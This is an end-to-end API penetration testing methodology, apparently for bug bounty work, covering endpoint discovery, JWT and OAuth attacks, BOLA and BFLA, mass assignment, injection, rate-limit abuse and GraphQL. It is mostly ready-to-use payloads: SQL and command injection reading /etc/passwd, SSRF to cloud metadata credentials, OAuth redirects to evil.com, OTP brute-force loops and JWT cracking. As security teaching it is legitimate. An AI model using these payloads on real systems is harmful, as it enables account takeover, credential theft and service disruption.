---
id: "api-penetration-testing"
title: "API Penetration Testing Methodology - End-to-End"
type: "methodology"
category: "web-application"
subcategory: "api"
tags: ["api", "rest", "graphql", "grpc", "owasp-api-top10", "bola", "bfla", "mass-assignment", "rate-limiting", "jwt", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["idor-bola", "auth-bypass-payloads", "oauth-jwt-saml-bypasses", "mass-assignment"]
updated: "2026-04-14"
---

## Overview

API penetration testing targets the programmatic interfaces that power modern applications. OWASP API Security Top 10 (2023) ranks authorization flaws (BOLA, BOPLA, BFLA) as the most common and most exploited patterns. APIs expose more attack surface than web UIs because they directly map to backend logic. Payout: $500-$50k+ depending on data exposure.

## Phase 1: Discovery & Documentation

### Find API endpoints
```bash
# From JavaScript analysis
katana -u https://target.com -jc -d 3 -o urls.txt
grep -E '/api/|/v[0-9]+/' urls.txt > api_endpoints.txt

# From Swagger/OpenAPI docs (common paths)
ffuf -u https://target.com/FUZZ -w api-docs-wordlist.txt -mc 200
# Try: /swagger.json, /openapi.json, /api-docs, /swagger-ui.html
# /v1/swagger.json, /v2/api-docs, /.well-known/openapi.yaml
# /graphql, /graphiql, /playground, /altair

# From traffic analysis
mitmproxy -w api_traffic.flow  # Capture mobile/SPA traffic

# From source/JS
grep -rE 'fetch\(|axios\.|\.get\(|\.post\(' app.js | grep -oE '"[^"]*"'
```

### API documentation mining
```
# GraphQL introspection
POST /graphql
{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}

# Swagger endpoint fuzzing
/swagger/v1/swagger.json
/api/swagger.json
/api-docs/swagger.json
/api/v1/documentation
/docs
/_api/docs
```

### Technology fingerprinting
```bash
# Identify API framework
httpx -u https://target.com/api/ -title -tech-detect -status-code
# Check response headers: X-Powered-By, Server, X-Request-Id format
# Check error responses for framework-specific patterns
```

## Phase 2: Authentication Testing

### JWT analysis
```bash
# Decode JWT
echo "eyJ..." | base64 -d

# Test algorithm confusion
# Change RS256 to HS256 and sign with the public key
python3 jwt_tool.py TOKEN -X a  # Algorithm confusion
python3 jwt_tool.py TOKEN -X n  # None algorithm
python3 jwt_tool.py TOKEN -X b  # Blank password
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # Crack HS256

# Test token manipulation
# Change user_id, role, email in payload
# Test expired tokens (do they still work?)
# Test tokens from one environment on another
```

### API key analysis
```
# Test API key in different positions
Authorization: Bearer KEY
X-API-Key: KEY
?api_key=KEY
Cookie: api_key=KEY

# Test API key permissions
# Does a read-only key allow writes?
# Does a user-level key access admin endpoints?
# Can you use another user's key?
```

### OAuth flow testing
```
# Test redirect_uri manipulation
redirect_uri=https://evil.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com@evil.com

# Test state parameter
# Remove state parameter entirely
# Reuse state across sessions
# Use predictable state values
```

## Phase 3: Authorization Testing (BOLA / BFLA)

### BOLA (Broken Object Level Authorization)
```
# Test every endpoint that uses an ID parameter
GET /api/v1/users/123/profile     # Change 123 to 124
GET /api/v1/orders/abc-def        # Change UUID
GET /api/v1/files/document.pdf    # Change filename
DELETE /api/v1/comments/456       # Delete another user's comment

# IDOR via different ID formats
/api/users/123          # Numeric
/api/users/user_abc     # String ID
/api/users/550e8400-... # UUID - try UUID v1 (time-based, predictable)

# IDOR in nested resources
GET /api/orgs/1/users/2/settings  # Change org ID
GET /api/projects/1/files/2       # Change project ID

# Test with Autorize (Burp extension)
# Set up low-priv session, replay high-priv requests
```

### BFLA (Broken Function Level Authorization)
```
# Access admin endpoints as regular user
GET /api/admin/users
POST /api/admin/settings
DELETE /api/users/1

# HTTP method switching
GET /api/users/1         # Works (read)
PUT /api/users/1         # Does it work? (update)
DELETE /api/users/1      # Does it work? (delete)
PATCH /api/users/1       # Does it work? (partial update)

# Version downgrade
/api/v2/users (secured) → /api/v1/users (unsecured?)

# Hidden admin endpoints (common patterns)
/api/internal/
/api/debug/
/api/_admin/
/api/management/
```

### BOPLA (Broken Object Property Level Authorization)
```json
// Mass assignment: send extra fields in updates
PUT /api/users/me
{"name":"hacker","role":"admin","verified":true,"balance":999999}

// Excessive data exposure: check response fields
// Does GET /api/users/123 return password_hash, SSN, internal_id?

// GraphQL specific
{user(id:123){name,email,passwordHash,internalNotes,ssn}}
```

## Phase 4: Injection Testing

### SQL injection in API parameters
```
GET /api/users?sort=name' OR 1=1--
GET /api/users?filter={"name":{"$gt":""}}  # NoSQL
GET /api/search?q=test' UNION SELECT 1,2,3--

POST /api/graphql
{"query":"{ user(id: \"1' OR '1'='1\") { name } }"}
```

### Server-Side Request Forgery
```json
POST /api/webhook
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

POST /api/import
{"source":"http://internal-service:8080/admin"}

POST /api/preview
{"url":"file:///etc/passwd"}
```

### Command injection
```
POST /api/convert
{"filename":"test.pdf; id"}

POST /api/dns-lookup
{"host":"example.com; cat /etc/passwd"}
```

## Phase 5: Business Logic Testing

### Rate limiting
```bash
# Test rate limits on sensitive endpoints
# Login brute force
ffuf -u https://target.com/api/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"FUZZ"}' \
  -w passwords.txt -rate 100

# OTP brute force (4-6 digit)
seq -w 0000 9999 | while read code; do
  curl -s https://target.com/api/verify-otp \
    -d '{"code":"'$code'"}' -H "Content-Type: application/json"
done

# Password reset flooding
# API key generation without limits
# Coupon/discount code brute force
```

### Business logic flaws
```
# Price manipulation
POST /api/checkout {"item_id":1,"price":0.01,"quantity":1}

# Negative quantity
POST /api/cart {"item_id":1,"quantity":-1}  # Refund?

# Race condition on balance
# Send 10 concurrent withdraw requests for the same balance

# Skip steps in multi-step process
# Go directly to step 3 without completing step 1 and 2

# Coupon stacking
POST /api/apply-coupon (apply same coupon twice)
POST /api/apply-coupon (apply multiple different coupons)
```

## Phase 6: GraphQL-Specific Testing

```graphql
# Introspection
{__schema{queryType{name}mutationType{name}types{name,fields{name,args{name}}}}}

# Batching attack (bypass rate limits)
[{"query":"mutation{login(email:\"a@b.com\",pass:\"pass1\")}"}, 
 {"query":"mutation{login(email:\"a@b.com\",pass:\"pass2\")}"},
 ...repeat 1000x]

# Alias-based batching
{a:login(e:"a@b.com",p:"pass1"){token} b:login(e:"a@b.com",p:"pass2"){token}}

# Nested query DoS
{users{friends{friends{friends{friends{name}}}}}}

# Field suggestion abuse (info disclosure)
{invalidField}  # Response may suggest valid field names

# Directive injection
{users @skip(if: false) {secretField}}
```

## Testing Checklist

```
[ ] API documentation discovered (Swagger, GraphQL introspection)
[ ] All endpoints enumerated and mapped
[ ] Authentication mechanisms identified and tested
[ ] JWT/token manipulation tested (none alg, key confusion, expiry)
[ ] BOLA tested on every ID-based endpoint
[ ] BFLA tested (user accessing admin functions)
[ ] Mass assignment tested on all write endpoints
[ ] Excessive data exposure checked on all read endpoints
[ ] Rate limiting tested on auth, OTP, sensitive operations
[ ] Input validation tested (SQLi, NoSQLi, SSRF, CMDi)
[ ] Business logic flaws tested (price, quantity, step-skipping)
[ ] GraphQL-specific tests if applicable
[ ] API versioning tested (v1 vs v2 security differences)
[ ] CORS policy tested
[ ] Error handling reviewed (info disclosure in errors)
```

## Tools

- **Burp Suite Pro** + Autorize, InQL, Param Miner extensions
- **Postman/Insomnia** -- API collection building and testing
- **jwt_tool** -- JWT manipulation and cracking
- **GraphQL Voyager** -- Schema visualization
- **Arjun** -- Parameter discovery
- **kiterunner** -- API endpoint discovery
- **mitmproxy** -- Traffic interception for mobile API testing
- **ffuf** -- Fuzzing API endpoints and parameters
- **nuclei** -- Automated API vulnerability templates
